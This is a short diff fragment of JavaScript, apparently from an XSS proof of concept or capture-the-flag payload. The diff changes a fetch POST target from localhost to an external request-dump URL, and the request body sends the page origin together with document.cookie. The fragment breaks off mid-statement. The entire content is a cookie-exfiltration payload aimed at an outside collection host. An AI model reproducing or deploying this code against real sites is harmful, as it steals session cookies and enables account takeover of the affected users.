@@ -1,5 +1,5 @@
 console.log("a");
-fetch('http://127.0.0.1/submit', {
+fetch('https://httpdump.app/dumps/27aa5ed1-1986-4fcb-ae3f-345b65860989', {
     method: 'POST',
     body: JSON.stringify({
         message: window.origin + " stuff "+document.cookie,
